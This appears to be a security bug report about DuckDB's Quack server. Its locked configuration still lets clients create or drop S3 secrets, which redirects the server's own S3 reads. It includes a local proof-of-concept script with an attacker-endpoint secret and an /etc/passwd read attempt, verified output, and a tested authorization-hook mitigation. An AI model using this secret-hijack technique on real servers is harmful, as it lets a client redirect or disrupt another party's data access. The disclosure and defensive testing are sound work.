# `lock_configuration=true` does not cover the secret manager: a Quack client can redirect the server's S3 reads

## Summary

On a locked Quack server (`allowed_directories`, `enable_external_access=false`, `lock_configuration=true`), any authenticated client can still run `CREATE [OR REPLACE] SECRET` and `DROP SECRET`. A client-created S3 secret with a longer `SCOPE` takes over the server's own reads, so a read-only client can break or redirect the instance's S3 access. The second suspected gap, `LOAD`, did not reproduce (see Context).

## Context

Manta's browser DuckDB-Wasm attaches over Quack to a server instance holding one project's datarecord store, S3 secret created at `datarecord/src/datarecord/store.py:135-164`.

- **Unlocked instance (verified):** a client reads `/etc/passwd`, runs `INSTALL`, changes `memory_limit`, and replaces the secret. Details in the `open` run of the script below.
- **Locked (verified):** file reads, `INSTALL` and `SET` are denied. `CREATE SECRET`, `CREATE OR REPLACE SECRET` and `DROP SECRET` are allowed.
- **Redirect (verified):** with a client secret scoped `s3://bucket/proj/`, the server's own `read_parquet('s3://bucket/proj/a.parquet')` went to the attacker's endpoint instead of the legitimate one. Unnamed `CREATE OR REPLACE SECRET` (what datarecord itself runs) did the same. The request was signed with the client's key id, so the server's key was not leaked. The `allowed_directories` entry is a path allow-list and does not constrain the endpoint. Whether the attacker's response bytes are then read as project data is **untested** (the fake endpoint returns 404).
- **`LOAD` (verified, not reproduced):** under the lock, `LOAD aws` (installed, not loaded) is denied: "Loading external extensions is disabled through configuration". That comes from `enable_external_access=false`, not the lock; a separate check with only `lock_configuration=true` let `LOAD aws` succeed. `LOAD json` and `LOAD httpfs` "succeed" under the lock only because they are statically linked or already loaded (no-ops). The earlier claim that `LOAD` gets through the lock holds only for no-ops.
- **Docs (read):** [securing DuckDB](https://duckdb.org/docs/2.0/operations_manual/securing_duckdb/overview.html): "`SET lock_configuration = true;` This prevents any configuration settings from being modified from that point onwards." Secrets are not settings, so they are not covered. The same page says queries can use any secret in the Secrets Manager. The [Quack security page](https://duckdb.org/docs/2.0/quack/security.html) says a server exposes "the full SQL surface" and the default authorization callback `quack_nop_authorization` returns every query unchanged.

## Minimal reproducer

`datarecord/.venv/bin/python -I repro.py` (fake S3 on 127.0.0.1 ports 9931/9932, Quack on 9933-9936, fake credentials, temporary secrets only). Modes: `open`, `locked`, `locked+hardening` (startup settings, below), `locked+hook` (a SELECT-only authorization macro).

```python
"""Quack lock repro. Run: datarecord/.venv/bin/python -I repro.py  (DuckDB 2.0.0, fake S3 on 127.0.0.1 only)."""
import http.server, re, subprocess, sys, threading, duckdb

AT, LEG, TOK = 9931, 9932, "tok-9931-test"   # attacker fake S3, legit fake S3 (ports), Quack token
HITS = []                                    # (endpoint, access key id) for every S3 request seen

def fake_s3(port, name):
    class H(http.server.BaseHTTPRequestHandler):
        def _l(self):
            m = re.search(r"Credential=([^/]+)/", self.headers.get("Authorization") or "")
            HITS.append((name, m.group(1) if m else None))
            self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
        do_GET = do_HEAD = _l
        def log_message(self, *a): pass
    threading.Thread(target=http.server.HTTPServer(("127.0.0.1", port), H).serve_forever, daemon=True).start()

def server(mode, port):  # child process: the "datarecord" instance
    cfg = {k: False for k in ("allow_persistent_secrets", "autoload_known_extensions", "autoinstall_known_extensions",
           "allow_community_extensions")} if mode == "locked+hardening" else {}   # must be set at startup
    db = duckdb.connect(":memory:", config=cfg)
    db.execute("INSTALL httpfs; LOAD httpfs; INSTALL quack; LOAD quack; INSTALL aws")  # aws: installed, not loaded
    db.execute(f"CREATE OR REPLACE SECRET (TYPE s3, KEY_ID 'SERVERKEY', SECRET 'x', ENDPOINT '127.0.0.1:{LEG}', "
               "URL_STYLE 'path', USE_SSL false)")             # like store.py:164, but explicit fake credentials
    db.execute(f"CALL quack_serve('quack:localhost:{port}', token='{TOK}')")
    if mode != "open":
        db.execute("SET allowed_directories=['s3://bucket/proj/']; SET enable_external_access=false")
        if mode == "locked+hook":  # authorization hook: SELECT-only (json_serialize_sql errors on other statements)
            db.execute("CREATE MACRO sel_only(sid, q) AS coalesce(try_cast(json_extract(json_serialize_sql(q), '$.error') AS BOOLEAN), false) = false")
            db.execute("SET GLOBAL quack_authorization_function='sel_only'")
        db.execute("SET lock_configuration=true")
    print("READY", flush=True)
    for _ in sys.stdin:  # parent asks for the server's own datarecord-style read
        try: db.execute("SELECT * FROM read_parquet('s3://bucket/proj/a.parquet')")
        except Exception: pass
        print("SRV done", flush=True)

def wait(p, tag):
    for line in p.stdout:
        if line.strip() == tag: return
    raise RuntimeError(f"server exited before {tag}")

def run(mode, port):
    p = subprocess.Popen([sys.executable, "-I", __file__, "server", mode, str(port)], text=True,
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    try:
        wait(p, "READY")
        c = duckdb.connect(":memory:"); c.execute("LOAD quack")
        c.execute(f"ATTACH 'quack:localhost:{port}' AS r (TOKEN '{TOK}')")
        def q(sql):
            try: return "ALLOWED " + str(c.execute(f"FROM r.query($${sql}$$)").fetchall()[:1])[:50]
            except Exception as e: return "DENIED  " + str(e).split("\n")[0][:60]
        def srv_read():
            HITS.clear(); p.stdin.write("go\n"); p.stdin.flush()
            wait(p, "SRV done")
            return f"server's own read hit {HITS}"
        evil = (f"(TYPE s3, KEY_ID 'ATTACKER', SECRET 'x', ENDPOINT '127.0.0.1:{AT}', URL_STYLE 'path', USE_SSL false")
        print(f"\n=== {mode}: a lock should DENY every client step below")
        print("  0 baseline", srv_read())
        for label, sql in [
            ("a1 CREATE SECRET, SCOPE s3://bucket/proj/", f"CREATE SECRET evil {evil}, SCOPE 's3://bucket/proj/')"),
            ("a2 DROP SECRET evil", "DROP SECRET evil")]:
            print(f"  {label}:", q(sql))
            if label.startswith("a1"): print("    ->", srv_read())
        print("  a3 CREATE OR REPLACE SECRET (unnamed):", q(f"CREATE OR REPLACE SECRET {evil})"))
        print("    ->", srv_read())
        print("  b1 LOAD aws (installed, not loaded):", q("LOAD aws"))
        print("  b2 LOAD json (statically linked, no-op):", q("LOAD json"))
        print("  d  SELECT 42 (must stay allowed):", q("SELECT 42"))
        for label, sql in [("c1 INSTALL json", "INSTALL json"), ("c2 SET enable_external_access=true", "SET enable_external_access=true"),
                           ("c3 SET memory_limit='1GB'", "SET memory_limit='1GB'"), ("c4 read_csv('/etc/passwd')", "SELECT count(*) FROM read_csv('/etc/passwd', sep=':')")]:
            print(f"  {label}:", q(sql))
    finally:
        p.stdin.close(); p.terminate(); p.wait()

if __name__ == "__main__":
    if sys.argv[1:2] == ["server"]: server(sys.argv[2], int(sys.argv[3]))
    else:
        fake_s3(AT, "attacker"); fake_s3(LEG, "legit")
        for mode, port in [("open", 9933), ("locked", 9934), ("locked+hardening", 9935), ("locked+hook", 9936)]: run(mode, port)
```

Output (**verified**), `locked` and `locked+hook` runs. `open` allowed everything except `c2`. `locked+hardening` was identical to `locked`.

```
=== locked: a lock should DENY every client step below
  0 baseline server's own read hit [('legit', 'SERVERKEY')]
  a1 CREATE SECRET, SCOPE s3://bucket/proj/: ALLOWED [(True,)]
    -> server's own read hit [('attacker', 'ATTACKER')]
  a2 DROP SECRET evil: ALLOWED []
  a3 CREATE OR REPLACE SECRET (unnamed): ALLOWED [(True,)]
    -> server's own read hit [('attacker', 'ATTACKER')]
  b1 LOAD aws (installed, not loaded): DENIED  Permission Error: Loading external extensions is disabled th
  b2 LOAD json (statically linked, no-op): ALLOWED []
  d  SELECT 42 (must stay allowed): ALLOWED [(42,)]
  c1 INSTALL json: DENIED  Permission Error: Cannot access directory "/Users/shanti/.du
  c2 SET enable_external_access=true: DENIED  Invalid Input Error: Cannot change configuration option ""en
  c3 SET memory_limit='1GB': DENIED  Invalid Input Error: Cannot change configuration option ""me
  c4 read_csv('/etc/passwd'): DENIED  Permission Error: Cannot access file "/etc/passwd" - file sy

=== locked+hook: a lock should DENY every client step below
  0 baseline server's own read hit [('legit', 'SERVERKEY')]
  a1 CREATE SECRET, SCOPE s3://bucket/proj/: DENIED  Invalid Input Error: Authorization failed
    -> server's own read hit [('legit', 'SERVERKEY')]
  a2 DROP SECRET evil: DENIED  Invalid Input Error: Authorization failed
  a3 CREATE OR REPLACE SECRET (unnamed): DENIED  Invalid Input Error: Authorization failed
    -> server's own read hit [('legit', 'SERVERKEY')]
  b1 LOAD aws (installed, not loaded): DENIED  Invalid Input Error: Authorization failed
  b2 LOAD json (statically linked, no-op): DENIED  Invalid Input Error: Authorization failed
  d  SELECT 42 (must stay allowed): ALLOWED [(42,)]
  c1 INSTALL json: DENIED  Invalid Input Error: Authorization failed
  c2 SET enable_external_access=true: DENIED  Invalid Input Error: Authorization failed
  c3 SET memory_limit='1GB': DENIED  Invalid Input Error: Authorization failed
  c4 read_csv('/etc/passwd'): DENIED  Permission Error: Cannot access file "/etc/passwd" - file sy
```

## Environment

DuckDB 2.0.0 (Python wheel), extensions quack `f96420ed46`, httpfs `77392a7207`, aws `16ae9c1353`. macOS 26.6.2 arm64 (Darwin 25.6.0), Python 3.14.5.

## Where it belongs

- **DuckDB upstream:** `lock_configuration` does not stop a client changing secret state, which decides which endpoint and credentials every later S3 read uses. Either the lock should freeze the secret manager, or the docs should say it does not. Not filed.
- **Manta:** do not rely on the lock. Enforce it in the Quack authorization hook (requirement 8 in `quack.md`).

## Suggested fix

- **Upstream:** have `lock_configuration` also reject `CREATE/DROP SECRET`, and treat extension loading as locked. Today only `enable_external_access=false` blocks loading, and only for extensions not already loaded.
- **Manta:** an authorization hook that denies non-SELECT statements. The macro in the `locked+hook` run denied `CREATE`/`DROP SECRET`, `LOAD`, `INSTALL` and `SET`, and allowed `SELECT 42` (**verified**). It does not cover `SELECT`-callable functions: `read_csv` was stopped by the lock, not the hook. Whether any `SELECT`-callable function mutates secrets is **untested**.
- **Settings tested, no effect on secrets (verified):** `allow_persistent_secrets=false` (startup only; setting it after the secret manager is used errors), `autoload_known_extensions=false`, `autoinstall_known_extensions=false`, `allow_community_extensions=false`. Client temporary secrets still worked.
- **Untested:** `allow_unsigned_extensions`, `extension_directories`, `default_secret_storage`, `disabled_filesystems`, `allowed_configs`.

## Open questions

- Do the attacker endpoint's response bytes reach the server as project data? That decides whether this is integrity as well as availability.
- Does the upstream project treat secrets as out of scope for `lock_configuration` by design?
